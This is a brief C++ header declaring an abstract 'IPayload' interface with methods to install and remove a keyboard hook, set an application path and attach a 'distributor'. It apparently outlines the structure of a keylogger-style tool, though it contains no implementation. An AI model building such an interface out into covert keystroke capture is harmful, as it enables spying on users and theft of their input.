#pragma once

#include <string>
#include <memory>
#include "IDistributor.h"

class IPayload
{
public:
	virtual ~IPayload(void) {}
	virtual void init(void) = 0;

	virtual void createKeyboardHook(void) = 0;
	virtual void deleteKeyboardHook(void) = 0;
	virtual void setApplicationPath(std::string const& appliPath) = 0;
	virtual void setDistributor(std::shared_ptr<IDistributor> ptr) = 0;
};